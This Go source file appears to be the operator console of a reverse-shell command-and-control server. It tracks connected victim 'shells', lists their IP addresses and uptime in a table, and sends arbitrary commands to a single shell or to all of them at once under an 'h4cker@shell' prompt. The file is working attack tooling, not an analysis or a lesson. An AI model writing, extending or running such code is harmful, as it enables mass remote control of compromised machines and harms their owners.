package main

import (
	"bufio"
	"fmt"
	"github.com/olekukonko/tablewriter"
	"log"
	"os"
	"strings"
	"time"
)


func GetStats() {
	stats := tablewriter.NewWriter(os.Stdout)
	stats.SetHeader([]string{"Identifier", "IP", "Online since"})

	ActiveShells.Range(func(key interface{}, value interface{}) bool {
		key = nil
		shell := value.(*Shell)

		stats.Append([]string{shell.Identifier, shell.Conn.RemoteAddr().String(), time.Since(shell.JoinDate).String()})
		return true
	})

	stats.Render()
}

func SendCommand(cmd []string) {
	if len(cmd) < 3 {
		fmt.Println("\x1b[91mInvalid command usage!")
		return
	}

	if cmd[1] == "all" {
		ActiveShells.Range(func(key interface{}, value interface{}) bool {
			key = nil
			shell := value.(*Shell)

			shell.GetCommandOutput([]byte(strings.Join(cmd[2:], " ")))

			return true
		})
	} else {
		shellId := cmd[1]

		shellInterface, exists := ActiveShells.Load(shellId)
		if !exists {
			fmt.Println("\x1b[91mInvalid shell id provided!")
			return
		}

		shell := shellInterface.(*Shell)
		fmt.Println("Executing on shell ip: " + shell.Conn.RemoteAddr().String())
		shell.GetCommandOutput([]byte(strings.Join(cmd[2:], " ")))
	}
}

func ShowHelp() {
	fmt.Printf("Available commands: exec, stats, help\r\n")
	fmt.Printf("exec:\r\n\t- used to execute a command\r\n\t- user can specify 'all' or manually enter a identifier to select which shells get the command\r\n\tUsage example: exec all ls\r\n")
	fmt.Printf("stats:\r\n\t- shows network statistics\r\n\tUsage example: stats\r\n")
	fmt.Printf("help:\r\n\t- shows this screen :D\r\n\tUsage example: stats\r\n")
}

func CommandHandler(cmd string) {
	commandSlice := strings.Split(cmd, " ")

	switch commandSlice[0] {
	case "exec":
		SendCommand(commandSlice)
		break
	case "stats":
		GetStats()
		break
	case "help":
		ShowHelp()
		break
	default:
		fmt.Println("\x1b[91mInvalid command!")
	}
}

func StartUserInterface() {
	reader := bufio.NewReader(os.Stdin)

	for {
		fmt.Printf("\r\x1b[95mh4cker\x1b[97m@\x1b[95mshell\x1b[97m ")

		input, _, err := reader.ReadLine()
		if err != nil { log.Fatalf("Could not read from stdin. Error: %s", err.Error()) }

		CommandHandler(string(input))
	}
}
